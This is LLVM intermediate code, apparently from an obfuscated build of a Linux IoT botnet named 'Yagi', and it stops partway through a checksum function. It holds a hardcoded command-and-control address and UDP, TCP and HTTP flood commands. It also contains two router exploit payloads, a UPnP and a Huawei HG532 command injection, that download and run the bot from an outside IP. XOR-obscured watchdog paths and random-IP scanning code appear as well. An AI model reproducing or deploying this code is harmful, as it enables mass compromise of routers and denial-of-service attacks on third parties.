; ModuleID = 'host/ir_fla/Yagi.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@c2_bot_port = global i32 27, align 4
@c2_http_host = global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@numattackpids = global i64 0, align 8
@UserAgents = global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@attackpids = common global i32* null, align 8
@retry = global i32 1, align 4
@retrys = global i32 3, align 4
@tryagain = global i32 1, align 4
@max_attacks = global i32 4, align 4
@maxboot_time = global i32 600, align 4
@trigger = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), align 8
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@C2 = global i32 -1, align 4
@ioctl_pid = global i32 0, align 4
@c2_host = common global [16 x i8] zeroinitializer, align 16
@Socket = common global %struct.sockaddr_in zeroinitializer, align 4
@buf = common global [1024 x i8] zeroinitializer, align 16
@buffer = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@pongresponse = common global [25 x i8] zeroinitializer, align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@exploit_scanner_pid = global i32 0, align 4
@exploit_fake_time = global i32 0, align 4
@conn_table = common global %struct.exploit_scanner_connection* null, align 8
@exploit_rsck = global i32 0, align 4
@exploit_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = global i32 0, align 4
@huawei_fake_time = global i32 0, align 4
@huawei_rsck = global i32 0, align 4
@huawei_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = common global [8 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -554832193, align 4

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1777449285, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1777449285, label %10
    i32 1325914328, label %14
    i32 -808038237, label %32
    i32 -709695491, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 1325914328, i32 -709695491
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -808038237, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -1777449285, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 1064084826, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1064084826, label %first
    i32 -540946534, label %30
    i32 411407318, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -540946534, i32 411407318
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 411407318, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1717294552, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1717294552, label %6
    i32 -1018231344, label %11
    i32 1082822581, label %20
    i32 159046382, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -1018231344, i32 159046382
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 1082822581, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 -1717294552, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 375456100, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 375456100, label %6
    i32 -719383082, label %10
    i32 -822960038, label %19
    i32 1805796059, label %23
    i32 -785535718, label %30
    i32 -804354990, label %31
    i32 -1420446186, label %36
    i32 -106757514, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -719383082, i32 -822960038
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 375456100, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
